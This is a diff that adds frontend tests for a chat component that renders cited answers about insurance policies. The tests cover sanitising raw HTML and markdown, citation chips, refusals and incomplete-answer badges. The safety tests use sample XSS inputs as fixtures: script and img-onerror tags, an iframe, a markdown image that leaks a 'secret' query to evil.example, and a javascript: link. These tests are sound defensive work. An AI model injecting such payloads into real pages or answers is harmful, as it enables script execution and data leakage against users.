@@ -145,3 +145,135 @@ describe('AssistantMessage', () => {
     expect(screen.getByText('uncited')).toBeInTheDocument();
   });
 });
+
+/** A finished answer with five retrieved sources of which only [1] was actually cited. */
+function answered(answer: string, onCite = vi.fn()) {
+  return render(
+    <AssistantMessage
+      onCite={onCite}
+      message={msg([
+        {
+          type: 'data-sources',
+          data: {
+            conversationId: 'c',
+            question: 'q',
+            sources: [1, 2, 3, 4, 5].map((n) => source(n, `C.${n}`)),
+          },
+        },
+        meta({
+          answer,
+          citations: [
+            { n: 1, chunkId: 'c1', documentId: 'd', clauseId: 'C.1', pageStart: 3, pageEnd: 3 },
+          ],
+        }),
+      ])}
+    />,
+  );
+}
+
+describe('AssistantMessage markdown safety', () => {
+  it('never renders raw HTML as live elements', () => {
+    const { container } = answered(
+      'Before <script>alert(1)</script> <img src=x onerror="alert(2)"> <iframe src="https://evil"></iframe> after [1].',
+    );
+    expect(container.querySelector('script, img, iframe')).toBeNull();
+    expect(container.querySelector('[onerror]')).toBeNull();
+    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
+  });
+
+  it('does not render markdown images, which would let an answer ping a remote server', () => {
+    const { container } = answered(
+      'Look ![tracking pixel](https://evil.example/x.png?q=secret) here [1].',
+    );
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.innerHTML).not.toContain('evil.example');
+  });
+
+  it('renders a javascript: link as plain text, not as an anchor', () => {
+    const { container } = answered('Click [here](javascript:alert(1)) now [1].');
+    expect(screen.getByText(/Click here now/)).toBeInTheDocument();
+    expect(container.querySelector('a')).toBeNull();
+    expect(container.innerHTML).not.toContain('javascript:');
+  });
+
+  it('renders links with an empty or non-web target as plain text', () => {
+    const { container } = answered('A [empty]() and [local](#section) and [rel](/admin) link [1].');
+    expect(container.querySelector('a')).toBeNull();
+    expect(screen.getByText(/A empty and local and rel link/)).toBeInTheDocument();
+  });
+
+  it('keeps ordinary https links, opened safely in a new tab', () => {
+    answered('See [the IRDAI site](https://irdai.gov.in/page) [1].');
+    const link = screen.getByRole('link', { name: 'the IRDAI site' });
+    expect(link).toHaveAttribute('href', 'https://irdai.gov.in/page');
+    expect(link).toHaveAttribute('target', '_blank');
+    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
+  });
+
+  it('makes a chip only for a citation the server validated, even when the source exists', () => {
+    answered('Valid [1] but a forged link [5](#cite-5).');
+    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
+    expect(screen.queryByRole('button', { name: /source 5/i })).toBeNull();
+    expect(screen.getByText(/forged link \[5\]\./)).toBeInTheDocument();
+  });
+});
+
+describe('AssistantMessage details', () => {
+  it('is memoized so finished messages skip re-rendering while a new one streams', () => {
+    expect((AssistantMessage as unknown as { $$typeof: symbol }).$$typeof).toBe(
+      Symbol.for('react.memo'),
+    );
+  });
+
+  it('shows the lead of a refusal and its verify line, without repeating the clause list', () => {
+    render(
+      <AssistantMessage
+        onCite={vi.fn()}
+        message={msg([
+          { type: 'data-sources', data: { conversationId: 'c', question: 'q', sources: [] } },
+          meta({
+            status: 'refused',
+            answer:
+              "I could not find an answer to this in the selected policies, so I will not guess.\n\nThe closest clauses I found were:\n- Star Comprehensive — clause B.2 (p. 3)\n\nPlease verify against your policy schedule and the insurer's latest wording.",
+            suggestions: [source(1, 'B.2')],
+          }),
+        ])}
+      />,
+    );
+    expect(screen.getByText(/I could not find an answer to this/)).toBeInTheDocument();
+    expect(screen.getByText(/Please verify against your policy schedule/)).toBeInTheDocument();
+    expect(screen.queryByText(/The closest clauses I found were/)).toBeNull();
+  });
+
+  it('marks an answer that ended without its final meta as incomplete, but not one still streaming', () => {
+    const parts: ClauseCiteUIMessage['parts'] = [
+      {
+        type: 'data-sources',
+        data: { conversationId: 'c', question: 'q', sources: [source(1, 'C.3')] },
+      },
+      { type: 'text', text: 'Half an answer [1] and [4]' },
+    ];
+    const { rerender } = render(
+      <AssistantMessage onCite={vi.fn()} message={msg(parts)} streaming />,
+    );
+    expect(screen.queryByText('incomplete')).toBeNull();
+    rerender(<AssistantMessage onCite={vi.fn()} message={msg(parts)} />);
+    expect(screen.getByText('incomplete')).toBeInTheDocument();
+    // Chips only for sources that exist: [4] has none.
+    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
+    expect(screen.queryByRole('button', { name: /source 4/i })).toBeNull();
+  });
+
+  it('shows no incomplete badge once the final meta arrived', () => {
+    render(
+      <AssistantMessage
+        onCite={vi.fn()}
+        message={msg([
+          { type: 'data-sources', data: { conversationId: 'c', question: 'q', sources: [] } },
+          meta({ answer: 'Done.' }),
+        ])}
+      />,
+    );
+    expect(screen.queryByText('incomplete')).toBeNull();
+  });
+});
